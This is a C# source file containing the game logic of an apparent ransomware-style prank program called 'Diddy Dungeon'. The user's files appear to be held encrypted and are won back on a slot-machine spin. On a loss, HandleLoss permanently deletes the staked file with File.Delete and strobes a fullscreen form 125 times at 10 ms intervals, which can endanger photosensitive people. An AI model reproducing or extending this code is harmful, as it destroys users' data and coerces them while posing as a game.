using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Diddy_Dungeon
{
    internal class GameLogic
    {
        enum Payout
        {
            None,   
            Full
        }

        public async Task Run()
        {
            // Start all slots at the same time
            Task<string> firstSpin = Spin(Form1.slotOutput1, 0);
            Task<string> secondSpin = Spin(Form1.slotOutput2, 2000); // Stops 500ms later
            Task<string> thirdSpin = Spin(Form1.slotOutput3, 3000); // Stops 1s later

            // Wait for all spins to complete
            string[] results = await Task.WhenAll(firstSpin, secondSpin, thirdSpin);

            Payout payout = CheckPayout(results);

            if (payout != Payout.None)
            {
                HandleWin();
            }
            else
            {
                //Task.Run(() => HandleLoss());
                await HandleLoss();
            }
        }

        private Payout CheckPayout(string[] results)
        {
            // Check if all three symbols are the same
            if (results[0] == results[1] && results[1] == results[2])
            {
                return Payout.Full;
            }
            // Check if two symbols match
            else if (results[0] == results[1] || results[1] == results[2] || results[0] == results[2])
            {
                return Payout.Full;
            }
            // If all symbols are different
            return Payout.None;
        }

        // Spin a wheel with a certain amount of delay till it stops
        private async Task<string> Spin(RichTextBox wheel, int stopDelay)
        {
            string[] symbols = { " 😈", " 👅", "❤️", "♠️", " 👽", " 💩", "☠️", " 💕", " 👾", " 🤖" };
            Random rand = new Random();
            int finalIndex = rand.Next(symbols.Length);
            int currentIndex = rand.Next(symbols.Length);
            int delay = 30; // Start fast
            int spinDuration = 60; // Fixed base spin time

            for (int i = 0; i < spinDuration; i++)
            {
                currentIndex = (currentIndex + 1) % symbols.Length;
                wheel.Text = symbols[currentIndex];
                await Task.Delay(delay);

                // Gradually slow down
                if (i > spinDuration * 0.5) delay += rand.Next(5, 15);
            }

            // Extra delay before stopping for staggered effect
            await Task.Delay(stopDelay);

            // Stop at final character
            wheel.Text = symbols[finalIndex];
            return symbols[finalIndex];
        }

        private void HandleWin()
        {
            // Decrypt File
            FileHandler.DecryptFile(Form1.betFilePath);

            FileHandler.ReturnAllFilesFromMem();

            // Update UI
            Form1.betFileDisplay.Text = "File Saved 😁👌\nAward: All your files back";

            // Re-enable bet button
            Form1.fileBetButton.Enabled = true;
        }

        private async Task HandleLoss()
        {
            // Delete File
            File.Delete(Form1.betFilePath);

            // Update UI
            Form1.betFileDisplay.Text = "WOMP WOMP! 😈👅 File deleted.";

            // Flash the screen
            for (int i = 0; i < 125; i++)
            {
                ScreenFlash screenFlash = new ScreenFlash();
                screenFlash.Show();
                await Task.Delay(10);
                screenFlash.Close();
            }

            // Re-enable bet button
            Form1.fileBetButton.Enabled = true;
        }
    }
}
